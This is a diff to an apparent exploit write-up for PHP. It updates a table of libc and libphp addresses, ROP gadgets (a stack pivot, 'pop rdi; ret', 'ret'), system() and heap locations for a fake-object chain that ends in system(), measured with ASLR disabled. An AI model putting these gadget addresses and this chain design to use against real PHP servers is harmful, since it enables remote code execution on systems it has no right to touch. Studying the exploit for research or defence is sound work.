@@ -91,15 +91,18 @@ So `handlers->free_obj = pivot`, `[object+0x40] = pop rdi; ret`,
 
 ## 4. Addresses (deterministic under `setarch -R`)
 
+Re-measured 2026-10-22 (libc base shifted -0x1000 vs the earlier build; offsets
+unchanged).
+
 | Symbol | Address |
 |--------|---------|
 | libphp base | `0x7ffff4400000` |
-| libc base | `0x7ffff7cd5000` |
-| `system` | `0x7ffff7d21490` |
+| libc base | `0x7ffff7cd4000` |
+| `system` | `0x7ffff7d20490` |
 | `zval_ptr_dtor` | `0x7ffff4b605f0` |
-| pivot (`jump_fcontext+0x30`) | `0x7ffff49fb8ae` |
-| `pop rdi; ret` (libc+0x277e5) | `0x7ffff7cfc7e5` |
-| `ret` (dtor_obj, libc+0x277e6) | `0x7ffff7cfc7e6` |
+| pivot (`jump_fcontext+0x2e`) | `0x7ffff49fb8ae` |
+| `pop rdi; ret` (libc+0x277e5) | `0x7ffff7cfb7e5` |
+| `ret` (dtor_obj, libc+0x277e6) | `0x7ffff7cfb7e6` |
 | `executor_globals` | `0x7ffff5b40fc0` |
 | stale backtrace header H | `0x7ffff72570e0` |
 | stale backtrace arData D | `0x7ffff7293008` |
